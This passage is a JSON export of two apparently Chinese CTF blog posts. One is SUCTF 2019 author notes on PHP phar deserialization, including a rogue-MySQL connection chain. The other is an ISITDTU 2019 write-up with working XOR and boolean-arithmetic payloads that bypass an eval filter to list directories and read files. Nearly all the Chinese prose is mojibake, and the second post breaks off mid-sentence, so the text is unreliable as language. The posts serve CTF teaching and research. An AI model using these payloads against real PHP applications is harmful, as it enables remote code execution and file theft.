åº”è¯¥ç”¨çš„__wakeup\u0026hellip;ä¸åº”è¯¥ç”¨çš„__destruct\u0026hellip;è‡ªå·±åŠå¤œå‡ºé¢˜ä¸æ˜¯å¾ˆæ¸…é†’\u0026hellip;éªŒé¢˜çš„å¸ˆå‚…ä¹Ÿæ²¡çœ‹å‡ºé—®é¢˜ï¼Œæå¾—è€ƒå¯Ÿçš„æœ€åä¸€ç¯å°±æ²¡äº†\u0026hellip;\nè¿™é¢˜å…¶å®ç¢ç£¨äº†æŒºä¹…ï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰æƒ³åˆ°æœ‰ä»€ä¹ˆå¥½çš„ pop é“¾ï¼Œå°±å‡ºé¢˜å‡ºæˆäº†è¿™ä¸ªäºšå­\u0026hellip;\nFINFO_FILE æœ€è¿‘ç ”ç©¶äº†ä¸€æ³¢ phar çš„ååºåˆ—åŒ–ï¼Œçœ‹äº†æ¯”è¾ƒå¤šçš„æ–‡ç« ï¼Œå…¶ä¸­æˆ‘è§‰å¾—å†™çš„å¾ˆæ£’ï¼Œå¯¹ CTFer ç‰¹åˆ«æœ‰ç”¨çš„å°±æ˜¯ @seaii çš„æ–‡ç«  åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢ \u0026amp; @zsx çš„æ–‡ç«  Pharä¸Stream Wrapperé€ æˆPHP RCEçš„æ·±å…¥æŒ–æ˜ï¼Œé€šè¿‡åœ¨è¿™ä¸¤ç¯‡æ–‡ç« çš„æ­éœ²ï¼Œæˆ‘ä»¬å¯ä»¥å‘æ˜åˆ°æ¯”è¾ƒå¤šçš„å‡½æ•°ï¼Œå½“æˆ‘åœ¨è‡ªå·±è¿›è¡Œç ”ç©¶çš„æ—¶å€™ï¼Œå‘ç°äº†\nfinfo_file/finfo_buffer/mime_content_type\nå‡é€šè¿‡_php_finfo_get_typeé—´æ¥è°ƒç”¨äº†å…³é”®å‡½æ•°php_stream_open_wrapper_exï¼Œå¯¼è‡´å‡å¯ä»¥ä½¿ç”¨phar://è§¦å‘ phar ååºåˆ—åŒ–ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘é€‰æ‹©äº†finfo_fileä½œä¸º phar ååºåˆ—åŒ–çš„è§¦å‘å‡½æ•°ã€‚\nä¸‰ä¸ªå‡½æ•°åœ¨ fileinfo.c 599 è¡Œä¸­ é€šè¿‡ _php_finfo_get_type å®šä¹‰ï¼Œåœ¨ 552 è¡Œä¸­ _php_finfo_get_types è°ƒç”¨äº† php_stream_open_wrapper_exï¼Œ\nphp://filter è§¦å‘å‡½æ•°æœ‰äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹é‡Œå°±æ˜¯è§¦å‘æ¡ä»¶äº†ã€‚æ—¢ç„¶æ˜¯ä¸æ–‡ä»¶æœ‰å…³çš„å‡½æ•°å‡èƒ½è§¦å‘ phar ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆä¼ªåè®®å‘¢ï¼Ÿ\né€šè¿‡ @zsx å¸ˆå‚…çš„æŒ–æ˜ï¼Œå‘ç°åŸºæœ¬ä¸Šå¤§å¤šæ•° PHP stream éƒ½å¯ä»¥é€šè¿‡ phar:// æ¥è§¦å‘ï¼Œä½†æ˜¯å°±æ˜¯æ²¡æœ‰æåŠ php:// ä¼ªåè®®ã€‚\nSoï¼Œè®©æˆ‘ä»¬ç”¨æœ€å¸¸è§çš„ php://filter/read=convert.base64-encode/resource=è¯•ä¸€ä¸‹\n \nå¥½çš„ï¼Œé‚£ä¹ˆå†çœ‹çœ‹æ–‡ä»¶åŒ…å«å¦‚ä½•\n \nä¸€ç‚¹ä¹Ÿä¸æ„å¤–ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ php://filter æ¥ç»•è¿‡ä¸€äº›å¼€å¤´é™åˆ¶è¿›è¡Œ phar ååºåˆ—åŒ–\nXXE 2 phar è¿˜æœ‰ä»¥åŠç¥ç§˜çš„ config.php åªæœ‰è¿™ä¹ˆä¸€å¥è¯ï¼š\nlibxml_disable_entity_loader(true); ç¦ç”¨äº†å¤–éƒ¨å®ä½“ï¼Œè™½ç„¶é¢˜ç›®ç»™å‡ºçš„åå°„ç±»ç¡®å®å¯ä»¥åå°„ï¼Œè€Œä¸”ä¹Ÿå¯ä»¥è¿›è¡Œ XXEï¼Œä¹Ÿæœ‰è¿‡ç›¸å…³çš„ CTFé¢˜ Annoying classï¼Œè™½ç„¶æ§åˆ¶äº† /flag è¯»å–æƒé™ï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆè¿˜è¦ç¦ç”¨å¤–éƒ¨å®ä½“å‘¢ï¼Ÿéš¾ä¸æˆ XXE ä¹Ÿå¯ä»¥ååºåˆ—åŒ–ï¼Ÿ\n \nTest.xml ä¸­çš„å†…å®¹å°±æ˜¯ä¸Šé¢ $xmlçš„å†…å®¹\n \nå½“ç„¶ php://filter åœ¨è¿™é‡Œä¹Ÿé€‚ç”¨\n \nMysql è€Œåå°±æ˜¯ admin.php ä¸­ä»¤äººå¼‚å¸¸ç–‘æƒ‘çš„å››æ®µä»£ç äº†ï¼š\n$reflect = new ReflectionClass($this-\u0026gt;clazz); $this-\u0026gt;instance = $reflect-\u0026gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod($this-\u0026gt;clazz, $this-\u0026gt;func1); $reflectionMethod-\u0026gt;invoke($this-\u0026gt;instance, $this-\u0026gt;arg1); $reflectionMethod = new ReflectionMethod($this-\u0026gt;clazz, $this-\u0026gt;func2); $reflectionMethod-\u0026gt;invoke($this-\u0026gt;instance, $this-\u0026gt;arg2); $reflectionMethod = new ReflectionMethod($this-\u0026gt;clazz, $this-\u0026gt;func3); $reflectionMethod-\u0026gt;invoke($this-\u0026gt;instance, $this-\u0026gt;arg3); æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå½“ç„¶å¦‚æœå‡ºé¢˜äººxxåœ°ç”¨__destructè‡ªç„¶æ²¡ä»€ä¹ˆç”¨ï¼Œå¦‚æœç”¨__wakeupï¼Œè‡ªç„¶å¾—æƒ³åŠæ³•å»è§¦å‘ååºåˆ—åŒ–ã€‚ç„¶è€Œè¿™å››æ®µä»£ç å…¶å®æ­£å¥½å¯¹åº”äº†ï¼š\n$m = new mysqli(); $m-\u0026gt;init(); $m-\u0026gt;real_connect(\u0026#39;ip\u0026#39;,\u0026#39;select 1\u0026#39;,\u0026#39;select 1\u0026#39;,\u0026#39;select 1\u0026#39;,3306); $m-\u0026gt;query(\u0026#39;select 1;\u0026#39;); å…¶å®ä¹Ÿå°±æ˜¯ @LoRexxar' åœ¨ Tsec ä¸Šè¿›è¡Œçš„åˆ†äº« Comprehensive analysis of the mysql client attack chain çš„å†…å®¹äº†ï¼Œ@zsx æ–‡ç« ä¸­æŒ‡å‡º\n \næ—¢ç„¶å¯ä»¥è¿™ä¹ˆè§¦å‘ï¼Œé‚£ä¹ˆ Rogue Mysql çš„æ”»å‡»å½“ç„¶é€‚ç”¨äº phar ååºåˆ—åŒ–äº†ã€‚\n$reflect = new ReflectionClass(\u0026#39;Mysqli\u0026#39;); $sql = $reflect-\u0026gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod(\u0026#39;Mysqli\u0026#39;, \u0026#39;init\u0026#39;); $reflectionMethod-\u0026gt;invoke($sql, $arr); $reflectionMethod = new ReflectionMethod(\u0026#39;Mysqli\u0026#39;, \u0026#39;real_connect\u0026#39;); $reflectionMethod-\u0026gt;invoke($sql, \u0026#39;ip\u0026#39;,\u0026#39;root\u0026#39;,\u0026#39;123456\u0026#39;,\u0026#39;test\u0026#39;,\u0026#39;3306\u0026#39;); $reflectionMethod = new ReflectionMethod(\u0026#39;Mysqli\u0026#39;, \u0026#39;query\u0026#39;); $reflectionMethod-\u0026gt;invoke($sql, \u0026#39;select 1\u0026#39;); Bonus: PHP is the best! mysqli-\u0026gt;real_connect() overwrites MYSQLI_OPT_LOCAL_INFILE setting\nSomething æ€»ä¹‹ï¼Œè¿™ä¸ªé¢˜ç›®æˆ‘å…ˆåˆ†äº«ç»™å¤§å®¶çš„ç‚¹å°±æ˜¯è¿™äº›äº†ï¼Œè¿™ä¸ªé¢˜æˆ‘è‡ªå·±è®¤ä¸ºè‡ªå·±å‡ºçš„ä¹Ÿä¸æ˜¯å¾ˆå¥½ï¼Œæ•´ä¸ªæ„é€ é“¾æ²¡æœ‰è®¾è®¡çš„ç‰¹åˆ«å¥½ï¼Œå‚è€ƒäº†æ¯”è¾ƒå¤šçš„é¢˜ï¼Œæ¯”å¦‚ 2018 N1CTF easy \u0026amp; hard phpï¼Œ2018 LCTF T4lk 1s ch34p,sh0w m3 the sh31l ç­‰ç­‰èµ›é¢˜ï¼Œæˆ‘è§‰å¾—è¿™äº›éƒ½æ˜¯å¾ˆä¼˜è´¨çš„èµ›é¢˜ï¼Œæˆ‘ä¹Ÿæƒ³å‘è¿™äº›èµ›é¢˜å»åŠªåŠ›ï¼Œå¯æƒœç”±äºè‡ªå·±çš„çŸ¥è¯†é¢ä»¥åŠçŸ¥è¯†æ·±åº¦çš„ä¸å¤Ÿï¼Œè¿˜ä¸èƒ½åšåˆ°é‚£ç§èµ›é¢˜çš„ç¨‹åº¦ï¼Œå°¤å…¶æ˜¯ @K0rz3n å¸ˆå‚…çš„å‡ºé¢˜ blog ï¼Œæˆ‘å‰å‰å‰ååè¯»äº†å¾ˆå¤šéï¼Œæœ€åè¿˜æ˜¯æ²¡æœ‰åšåˆ°åƒ @K0rz3n \u0026amp; @wupco å¸ˆå‚…é‚£æ ·çš„å‡ºé¢˜æ·±åº¦ï¼Œéš¾ä»¥æœ›å…¶é¡¹èƒŒã€‚\nConclusion æœ€åï¼Œå¦‚æœæœ‰å°ä¼™ä¼´å¸Œæœ›ä¸æˆ‘ä¸€èµ·äº¤æµæ¢ç´¢ phar çš„ä¸€äº›å° trick æˆ–è€…äº¤æµä¸€äº›å…¶ä»–çŸ¥è¯†ï¼Œæ¬¢è¿æ¥ä¿¡ï¼šzeddyu.lu#gmail.comï¼Œå¦‚æœå¤§å®¶æœ‰æ„æ„¿åŠ å…¥ SUï¼Œä¹Ÿæ¬¢è¿æ¥ä¿¡åˆ°ï¼šsuers_xctf#126.com\næœ€åçš„æœ€åï¼Œå¾ˆæ„Ÿè°¢å¤§å®¶çš„ä¸æ€ä¹‹æ©ï¼Œè¿™æ¬¡ SUCTF çš„ä¸¾åŠä¸»è¦ä¾é çš„æ˜¯æ–°ä¸€ä»£é˜Ÿå‘˜çš„åŠªåŠ›ï¼Œç”±äºæ–°ä¸€ä»£é˜Ÿå‘˜åœ¨è¿ç»´ã€å‡ºé¢˜æ–¹é¢ç»éªŒéƒ½ä¸æ˜¯ç‰¹åˆ«è€é“ï¼Œæ‰€ä»¥åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­äº§ç”Ÿäº†äº›è®¸æ„å¤– \u0026amp; å¤±è¯¯ï¼Œå¸Œæœ›å¤§å®¶å¤šå¤šè§è°…ï¼Œåœ¨è¿™é‡Œç»™ä½“éªŒä¸å¥½çš„å¸ˆå‚…ä»¬è°¢ç½ªäº†ï¼Œå“å“å“ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿä¼šå‘ç€æ›´å¥½çš„æ–¹å‘åŠªåŠ›ï¼Œå¸¦ç»™å¸ˆå‚…ä»¬æ›´å¥½çš„æ¯”èµ›ä½“éªŒã€‚\nåƒã€Šå¤´å·ç©å®¶ã€‹é‡Œé¢çš„ä¸€å¥è¯ä¸€æ ·ï¼Œæ„Ÿè°¢å¤§å®¶æŠ½æ—¶é—´æ¥æ‰“æˆ‘ä»¬çš„æ¯”èµ›ï¼\n","date":"2019-08-24T20:41:16Z","permalink":"https://blog.zeddyu.info/2019/08/24/SUCTF-2019/","title":"SUCTF 2019 å‡ºé¢˜ç¬”è®° \u0026 phar ååºåˆ—åŒ–çš„ä¸€äº›æ‹“å±•"},{"content":"åœ¨ ISITDTU CTF 2019 ä¸Šåšäº†ä¸€é“æ¯”è¾ƒæœ‰æ„æ€çš„ä»£ç å®¡è®¡é¢˜ï¼Œä¸»è¦åº”ç”¨äº† php å¼‚æˆ–ç­‰æ“ä½œè¿›è¡Œ getshellï¼Œæ”¶è·è¿˜æ˜¯æŒºå¤šçš„ã€‚æœ€è¿‘è¶Šæ¥è¶Šå–œæ¬¢çœ‹è¿™ç§ä»£ç ç®€å•ï¼Œä½†æ˜¯åˆè•´å«ç„æœºçš„ä¸œè¥¿äº†\u0026hellip;\nDescription  â€‹\tDon\u0026rsquo;t try to run any Linux command, just use all the PHP functions you know to get the flag\n \u0026lt;?php highlight_file(__FILE__); $_ = @$_GET[\u0026#39;_\u0026#39;]; if ( preg_match(\u0026#39;/[\\x00- 0-9\\\u0026#39;\u0026#34;`$\u0026amp;.,|[{_defgops\\x7F]+/i\u0026#39;, $_) ) die(\u0026#39;rosÃ© will not do it\u0026#39;); if ( strlen(count_chars(strtolower($_), 0x3)) \u0026gt; 0xd ) die(\u0026#39;you are so close, omg\u0026#39;); eval($_); ?\u0026gt;Write Up Explation é¢˜ç›®ä»£ç æ¯”è¾ƒç®€å•ï¼Œé¦–å…ˆçœ‹çœ‹ç¬¬ä¸€ä¸ªæ­£åˆ™ï¼š\n \nå†çœ‹çœ‹ç¬¬äºŒä¸ªè¿‡æ»¤ï¼Œstrtolowerå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼Œç”¨count_charsè¿”å›ç”±æ‰€æœ‰ä½¿ç”¨äº†çš„å­—èŠ‚å€¼ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œå†åˆ¤æ–­å…¶ä¸­æ¯ä¸ªå­—ç¬¦ç´¯è®¡å‡ºç°æ¬¡æ•°æ˜¯å¦å¤§äº 13\nDoing Step 1 æ—¢ç„¶æ­£åˆ™çº¦æŸäº†æ¯”è¾ƒå¤šçš„æ¡ä»¶ï¼Œè‡ªç„¶æˆ‘ä»¬é¦–å…ˆå¾—çœ‹çœ‹è¿˜æœ‰å“ªäº›å¯ç”¨çš„ã€‚\n\u0026lt;?php $arr = get_defined_functions()[\u0026#39;internal\u0026#39;]; foreach ($arr as $key =\u0026gt; $value) { if ( preg_match(\u0026#39;/[\\x00- 0-9\\\u0026#39;\u0026#34;`$\u0026amp;.,|[{_defgops\\x7F]+/i\u0026#39;, $value) ){ unset($arr[$key]); continue; } if ( strlen(count_chars(strtolower($value), 0x3)) \u0026gt; 0xd ){ unset($arr[$key]); continue; } } var_dump($arr); ?\u0026gt;å¾—åˆ°è¿˜å‰©ä¸‹ä»¥ä¸‹å†…ç½®å‡½æ•°å¯ç”¨ï¼š\narray(15) { [206]=\u0026gt; string(5) \u0026#34;bcmul\u0026#34; [1060]=\u0026gt; string(5) \u0026#34;rtrim\u0026#34; [1066]=\u0026gt; string(4) \u0026#34;trim\u0026#34; [1067]=\u0026gt; string(5) \u0026#34;ltrim\u0026#34; [1078]=\u0026gt; string(3) \u0026#34;chr\u0026#34; [1102]=\u0026gt; string(4) \u0026#34;link\u0026#34; [1103]=\u0026gt; string(6) \u0026#34;unlink\u0026#34; [1146]=\u0026gt; string(3) \u0026#34;tan\u0026#34; [1149]=\u0026gt; string(4) \u0026#34;atan\u0026#34; [1150]=\u0026gt; string(5) \u0026#34;atanh\u0026#34; [1154]=\u0026gt; string(4) \u0026#34;tanh\u0026#34; [1255]=\u0026gt; string(6) \u0026#34;intval\u0026#34; [1403]=\u0026gt; string(4) \u0026#34;mail\u0026#34; [1444]=\u0026gt; string(3) \u0026#34;min\u0026#34; [1445]=\u0026gt; string(3) \u0026#34;max\u0026#34; } è¿™æ ·è¿™é¢˜çœ‹èµ·æ¥ä¸å›½èµ›é‚£ä¸ª Love_Math é¢˜ç›®å°±æœ‰ç‚¹ç±»ä¼¼äº†ï¼Œçœ‹èµ·æ¥intvalè·Ÿchrè²Œä¼¼æœ‰ç‚¹æå¤´ï¼Œä½†æ˜¯æ•°å­—å´åˆè¢« ban æ‰äº†â€¦é‚£æˆ‘ä»¬å°±åªèƒ½å¦å¯»ä»–è·¯äº†\u0026hellip;\nStep 2 è™½ç„¶åŒå¼•å·è·Ÿå•å¼•å·éƒ½è¢« ban æ‰äº†ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ php åœ¨è·å– HTTP GET å‚æ•°çš„æ—¶å€™é»˜è®¤æ˜¯è·å¾—åˆ°äº†å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥å³ä½¿åŒå¼•å·è·Ÿå•å¼•å·è¢« ban äº†å…¶å®å¹¶æ²¡æœ‰å¤ªå¤§çš„å½±å“ã€‚è€Œæˆ‘ä»¬è¿˜å¯ä»¥çŸ¥é“ï¼Œå­—ç¬¦ä¸²è¿˜å¯ä»¥ç”¨!æ“ä½œç¬¦æ¥è¿›è¡Œå¸ƒå°”ç±»å‹çš„è½¬æ¢ï¼Œå¦‚ä¸‹ï¼š\nphp \u0026gt; var_dump(!a); PHP Notice: Use of undefined constant a - assumed \u0026#39;a\u0026#39; in php shell code on line 1 bool(false) php \u0026gt; var_dump(!!a); PHP Notice: Use of undefined constant a - assumed \u0026#39;a\u0026#39; in php shell code on line 1 bool(true) å¯ä»¥å†åŠ ä¸€ä¸ª@å¿½ç•¥ notice è¾“å‡º\n\u0026lt;?php var_dump(@a);\t//string(1) \u0026#34;a\u0026#34; var_dump(!@a);\t//bool(false) var_dump(!!@a);\t//bool(true) è€Œå¯¹ bool ç±»å‹ä½¿ç”¨åŠ æ³•çš„æ—¶å€™ï¼Œ php åˆ™ä¼šå°† bool ç±»å‹å¤„ç†ä¸ºæ•°å­—ï¼Œtrue è½¬æ¢ä¸º 1 ï¼Œ false ä¸º 0 ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥å®ç°æ•°å­—è®¡ç®—ï¼š\n\u0026lt;?php var_dump(!!@a + !!@a);\t//int(2) 1+1 var_dump((!!@a + !!@a) * (!!@a + !!@a + !!@a + !!@a));\t//int(6) (1+1)*(1+1+0+1) æ‰€ä»¥ï¼Œè¿™æ ·å¤§æ¦‚æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨chr()è¿›è¡Œæ•°å­—è½¬æ¢å¾—åˆ°å­—ç¬¦äº†ï¼Œå¹¶ä¸”æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨\u0026quot;phpinfo\u0026quot;()çš„ç‰¹æ€§ï¼Œé€šè¿‡å­—ç¬¦ä¸²æ‹¼å‡‘ï¼Œå¯ä»¥å¾—åˆ° phpinfo:\n(chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a)) .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a )) .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a)) .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a ) + !!@a) .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) * ((!!@a + !!@a + !!@a) ** (!!@a + !!@a) )) .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a ) - !!@a - !!@a) .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a) - !!@a))();  \nä½†æ˜¯è¿™é‡Œè¦éœ€è¦ç”¨åˆ°.è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç„¶è€Œ.åˆè¢« ban æ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—å¦å¯»ä»–è·¯\nStep 3 è§‚å¯Ÿæ­£åˆ™è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨çš„ç¬¦å·æœ‰ï¼š\n['!', '%', '+', '-', '*', '/', '\u0026gt;', '\u0026lt;', '?', '=', ':', '@', '^'] æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°å¦ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„ç‚¹ï¼Œå°±æ˜¯^å¼‚æˆ–ç¬¦å·æ²¡æœ‰è¢« ban ï¼Œåœ¨ä¸€äº›å…æ€é©¬é‡Œé¢å°±ç»å¸¸ç”¨^å¼‚æˆ–æ¥è¿›è¡Œæ··æ·†ã€‚é€šè¿‡æŸ¥é˜…phpæ–‡æ¡£ æˆ‘ä»¬å¯ä»¥çŸ¥é“\n â€‹\tIf both operands for the \u0026amp;, | and ^ operators are strings, then the operation will be performed on the ASCII values of the characters that make up the strings and the result will be a string. In all other cases, both operands will beconverted to integers and the result will be an integer.\n å­—ç¬¦ä¸²çš„å¼‚æˆ–æ“ä½œæ˜¯åŸºäºå­—ç¬¦çš„ ASCII ç æ¥è¿›è¡Œæ“ä½œçš„ï¼Œä¾‹å¦‚ï¼š\nphp \u0026gt; var_dump(@a^\u0026#34;1\u0026#34;); string(1) \u0026#34;P\u0026#34; php \u0026gt; echo ord(\u0026#34;a\u0026#34;); 97 php \u0026gt; echo ord(\u0026#34;1\u0026#34;); 49 php \u0026gt; echo 97^49; 80 php \u0026gt; echo chr(80); P æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä¹‹å‰çš„æ•°å­—æ“ä½œåŠ ä¸Šå¼‚æˆ–å°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬è‡ªå·±æƒ³è¦çš„æ“ä½œäº†ã€‚\nphp \u0026gt; var_dump(@p^\u0026#34;1\u0026#34;); string(1) \u0026#34;A\u0026#34; php \u0026gt; var_dump(@h^\u0026#34;1\u0026#34;); string(1) \u0026#34;Y\u0026#34; php \u0026gt; var_dump(@i^\u0026#34;1\u0026#34;); string(1) \u0026#34;X\u0026#34; php \u0026gt; var_dump(@n^\u0026#34;4\u0026#34;); string(1) \u0026#34;Z\u0026#34; php \u0026gt; var_dump(@f^\u0026#34;1\u0026#34;); string(1) \u0026#34;W\u0026#34; php \u0026gt; var_dump(@o^\u0026#34;5\u0026#34;); string(1) \u0026#34;Z\u0026#34; php \u0026gt; var_dump(@phpinfo^\u0026#34;1111415\u0026#34;); string(7) \u0026#34;AYAXZWZ\u0026#34; php \u0026gt; var_dump(@AYAXZWZ^\u0026#34;1111415\u0026#34;); string(7) \u0026#34;phpinfo\u0026#34; æ¥ä¸‹æ¥å°±æ˜¯æ•°å­¦æ—¶é—´äº†ï¼Œå¦å¤–ï¼Œå¯¹äº int å‹åˆ° string çš„è½¬æ¢ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨trimè¿›è¡Œæ“ä½œã€‚\nvar_dump( trim( (!!@a + !!@a + !!@a + !!@a + !!@a) * ((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) + (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a) + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) * ((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a+ !!@a+ !!@a) + (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a ) - (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a) - !!@a - !!@a- !!@a) ) ^ @AYAXZWZ );//phpinfo  \nç»“æœå›æ˜¾you are so close, omg\nStep 4 ç»•è¿‡äº†æ­£åˆ™æ¥ä¸‹æ¥å°±æ˜¯å¤„ç†æ¯ä¸ªå­—ç¬¦å‡ºç°æ¬¡æ•°å¾—å°äº 13 çš„é—®é¢˜äº†ã€‚\næ‰€ä»¥æˆ‘ä»¬éœ€è¦ç²¾ç®€ä¸€ä¸‹å¼‚æˆ–æ“ä½œï¼Œå°½é‡æ‰¾ä¸€äº›ç›¸åŒçš„å­—ç¬¦è¿›è¡Œæ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹çš„å¼‚æˆ–å…³ç³»ï¼š\np: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9| h: |Q ^ 9|X ^ 0|Y ^ 1|Z ^ 2| p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9| i: |Q ^ 8|X ^ 1|Y ^ 0|Z ^ 3| n: |V ^ 8|W ^ 9|X ^ 6|Y ^ 7|Z ^ 4| f: |Q ^ 7|R ^ 4|T ^ 2|U ^ 3|V ^ 0|W ^ 1| o: |V ^ 9|W ^ 8|X ^ 7|Y ^ 6|Z ^ 5| å°½é‡æ‰¾åˆ°ç›¸åŒå­—ç¬¦è¿›è¡Œæ‹¼å‡‘ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°AYAYYRY ^ 1110746ï¼ŒAYRåŠ ä¸Štrimä¸­çš„timï¼Œå†åŠ ä¸Š!!(+*);ï¼Œæˆ‘ä»¬è¿™æ ·åªç”¨ 13 ä¸ªå­—ç¬¦å¾—åˆ°äº†phpinfo()ã€‚\n(AYAYYRY^trim(((((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a)))+(((!!a+!!a))**((!!a))))))();  \nè¿™é‡Œå¯èƒ½éœ€è¦æ³¨æ„çš„å°±æ˜¯å°†+è¿›è¡Œ urlencode ï¼Œå› ä¸º+åœ¨ url ä¸­æ˜¯ç©ºæ ¼ã€‚\nStep 5 æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŒ‰ç…§åŒæ ·çš„ç¼–ç æ–¹å¼ï¼Œå°½é‡æ‰¾ç›¸åŒçš„å­—ç¬¦ï¼Œå°±å¯ä»¥æ‰§è¡Œç›¸å…³çš„ php å‡½æ•°äº†ï¼Œé€šè¿‡ä»¥ä¸‹æ­¥éª¤å°±å¯ä»¥æ‹¿åˆ° flag äº†\nvar_dump(scandir(getcwd())); array(4) { [0]=\u0026gt; string(1) \u0026#34;.\u0026#34; [1]=\u0026gt; string(2) \u0026#34;..\u0026#34; [2]=\u0026gt; string(9) \u0026#34;index.php\u0026#34; [3]=\u0026gt; string(34) \u0026#34;n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt\u0026#34; } var_dump(file_get_contents(end(scandir(getcwd())))); string(34) \u0026#34;ISITDTU{Your PHP skill is so good}\u0026#34; Another Way-Step 1 å•æ¬¡å¼‚æˆ–å¯èƒ½ä¼šæœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸¤æ¬¡æˆ–è€…å¤šæ¬¡å¼‚æˆ–æ¥è¿›è¡Œå­—ç¬¦ä¸²çš„æ„é€ ï¼š\n(qiqhnin^iiiiibi^hhhhimh)();//phpinfo()  \nAnother Way-Step 2 æ¥ç€æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åå…­è¿›åˆ¶å¼‚æˆ–æ¥è¿›è¡Œå­—ç¬¦ä¸²æ“ä½œäº†ã€‚ä¾‹å¦‚ï¼š\nprint_r ^ 0xff -\u0026gt; 0x8f8d96918ba08d -\u0026gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%8f%8d%96%91%8b%a0%8d)) scandir ^ 0xff -\u0026gt; 0x8c9c9e919b968d -\u0026gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%91%9b%96%8d)) . ^ 0xff -\u0026gt; 0xd1 -\u0026gt; ((%ff)^(%d1)) å½“ç„¶ä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ 0xff ï¼Œä½¿ç”¨ä»¥ä¸‹ payload å°±å¯ä»¥åœ¨æ²¡æœ‰å­—ç¬¦é™åˆ¶çš„æ—¶å€™è¿›è¡Œåˆ—ç›®å½•äº†ï¼š\n((%ff%ff%ff%ff%ff%ff%ff)^(%8f%8d%96%91%8b%a0%8d))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%91%9b%96%8d))(((%ff)^(%d1)))); Another 